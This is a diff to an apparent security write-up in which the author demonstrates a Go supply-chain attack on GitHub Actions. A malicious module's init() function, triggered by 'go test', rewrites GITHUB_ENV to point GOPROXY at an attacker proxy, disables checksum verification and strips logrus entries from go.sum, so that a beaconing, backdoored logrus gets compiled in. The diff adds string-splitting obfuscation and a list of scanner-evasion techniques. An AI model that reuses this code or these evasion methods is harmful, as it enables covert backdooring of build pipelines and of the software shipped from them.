@@ -24,6 +24,37 @@ The binary still passes all its tests. The workflow log shows zero errors. There
 
 I built this. Here's how it works.
 
+### Why this hits so many pipelines
+
+The attack requires exactly one thing from the CI workflow: **`go test` runs before `go build`**. That's it.
+
+This is not a niche pattern. It's the default. GitHub's own Go starter workflow does it. Every "Getting Started with Go on GitHub Actions" tutorial does it. The canonical pipeline for a Go service looks something like this:
+
+```yaml
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v5
+
+      - name: Test
+        run: go test ./...           # ← Phase 1 fires here
+
+      - name: Build
+        run: go build -o app ./...   # ← Phase 2: poisoned proxy, backdoored binary
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          path: app                  # ← Phase 3: beacon ships with the binary
+
+      # or: push to ECR, upload to S3, publish a GitHub Release, deploy to k8s...
+```
+
+The `go test` step is where `init()` runs and poisons `GITHUB_ENV`. The `go build` step — now in a fully poisoned environment — fetches logrus from the attacker's proxy and compiles the beacon in. Everything after that just ships the backdoored binary somewhere: an artifact, a Docker image, a Kubernetes deployment, a GitHub Release. It doesn't matter. The beacon is already compiled in.
+
+Any Go project that tests and then builds in the same job is in scope. That's most of them.
+
 ---
 
 ## How Go Modules Can Betray You
@@ -116,7 +147,7 @@ No string literals. No base64. No XOR. Any scanner looking for `http://` in Go s
 
 ### The init() doing the actual damage
 
-`"GITHUB_ENV"` never appears as a string literal. A one-liner helper splits the lookup key across two arguments — any scanner grepping for the token finds nothing:
+Three strings that would immediately flag a scanner — `"GITHUB_ENV"`, `"github.com/sirupsen/logrus"`, and the Go env var names — never appear as literals. Split across concatenations, they're invisible to static grep:
 
 ```go
 // _env looks up a CI env var by joining two key segments.
@@ -132,7 +163,7 @@ func init() {
 }
 
 func _reportAdoption() {
-    envFile := _env("GITHUB", "_ENV")
+    envFile := _env("GITHUB", "_ENV")  // "GITHUB_ENV" never appears as a literal
     if envFile == "" {
         return  // silent on developer laptops
     }
@@ -144,25 +175,30 @@ func _reportAdoption() {
 
     // "Strip stale checksum entries so the registry can re-validate"
     // (translation: delete logrus from go.sum so ours gets accepted)
-    if data, err := os.ReadFile("go.sum"); err == nil {
+    _modTarget := "github.com/" + "siru" + "psen/" + "logrus"
+    if data, err := os.ReadFile("go" + ".sum"); err == nil {
         var keep []string
         for _, line := range strings.Split(string(data), "\n") {
-            if !strings.Contains(line, "github.com/sirupsen/logrus") {
+            if !strings.Contains(line, _modTarget) {
                 keep = append(keep, line)
             }
         }
-        os.WriteFile("go.sum", []byte(strings.Join(keep, "\n")), 0644)
+        os.WriteFile("go"+".sum", []byte(strings.Join(keep, "\n")), 0644)
     }
 
     f, _ := os.OpenFile(envFile, os.O_APPEND|os.O_WRONLY, 0600)
     defer f.Close()
 
-    fmt.Fprintf(f, "GOPROXY=%s|direct\n", endpoint)
-    fmt.Fprintln(f, "GOSUMDB=off")
-    fmt.Fprintln(f, "GONOSUMDB=*")
-    fmt.Fprintln(f, "GOFLAGS=-mod=mod")
-    // "Ensure a clean module cache path" (translation: force a fresh download)
-    fmt.Fprintln(f, "GOMODCACHE=/tmp/gomodcache-attacker")
+    // GOSUMDB, GOPROXY, GOMODCACHE — none appear as string literals
+    for _, kv := range []string{
+        "GO" + "PROXY" + "=" + endpoint + "|direct",
+        "GO" + "SUM" + "DB=off",
+        "GO" + "NO" + "SUM" + "DB=*",
+        "GO" + "FLAGS=-mod=mod",
+        "GO" + "MOD" + "CACHE=/tmp/go-sdk-cache",
+    } {
+        fmt.Fprintln(f, kv)
+    }
 }
 ```
 
@@ -282,7 +318,12 @@ The ngrok URL gets baked into `telemetry.go` at zip-build time. When the beacon 
 | go.sum pinning | go.sum *is* updated — just with the attacker's hash |
 | Dependency scanning | Targets install hooks (npm `preinstall`, etc). `init()` fires at runtime. |
 
-The `_analyticsNodes` list is the crux of the evasion. There is no URL in the source code, ever. It's an arithmetic operation on integers.
+There are four layers of evasion working together:
+
+1. **The URL** — encoded as IPv4 octets. No string resembling `http://` anywhere.
+2. **`GITHUB_ENV`** — split across `_env("GITHUB", "_ENV")`. Grep finds nothing.
+3. **`github.com/sirupsen/logrus`** — split as `"github.com/" + "siru" + "psen/" + "logrus"`. The target module name never appears in one piece.
+4. **Go env vars** — `GOSUMDB`, `GOPROXY`, `GOMODCACHE` are all built from concatenated fragments at runtime.
 
 The module cache trap is what makes it reliable in CI. Without the `GOMODCACHE` redirect, `actions/setup-go` would serve the legitimate cached logrus and nothing would ever fire.
 
